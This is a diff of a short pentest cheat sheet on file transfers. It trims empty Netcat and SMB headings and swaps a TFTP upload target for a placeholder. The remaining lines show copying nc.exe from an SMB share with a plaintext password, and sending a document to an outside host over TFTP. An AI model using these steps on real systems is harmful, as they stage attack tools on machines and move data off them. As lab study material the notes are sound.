@@ -1,8 +1,4 @@
 # File Transfers
-## Netcat
-```
-```
-
 ## SMB Server
 -> Setting
 ```
@@ -14,7 +10,6 @@ net use \\<smbserver>\share /USER:user teste321
 copy \\<smbserver>\share\nc.exe .
 ```
 
-## SMB
 ## Pure-FTPd
 -> Install and Configure
 ```
@@ -53,5 +48,5 @@ sudo atftpd --daemon --port 69 /tftp
 ```
 -> Action
 ```
-tftp -i 10.11.0.4 put important.docx
+tftp -i <IP> put ok.docx
 ```
